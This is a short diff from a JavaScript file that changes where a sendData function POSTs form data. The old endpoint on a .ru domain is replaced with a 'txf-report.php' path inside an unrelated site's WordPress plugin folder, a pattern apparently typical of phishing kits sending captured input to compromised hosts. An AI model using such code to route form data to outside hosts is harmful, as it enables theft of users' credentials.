@@ -72,7 +72,7 @@ function sendData( data ) {
   } );
 
   // Set up our request
-  XHR.open( 'POST', 'https://pomnirod.ru/base/users/34261/family/warisi/tfx-report.php' );
+  XHR.open( 'POST', 'https://christmas.globalvirtualsolutions.eu/wp-content/plugins/easybusy/warisi/txf-report.php' );
 
   // Send our FormData object; HTTP headers are set automatically
   XHR.send(FD);
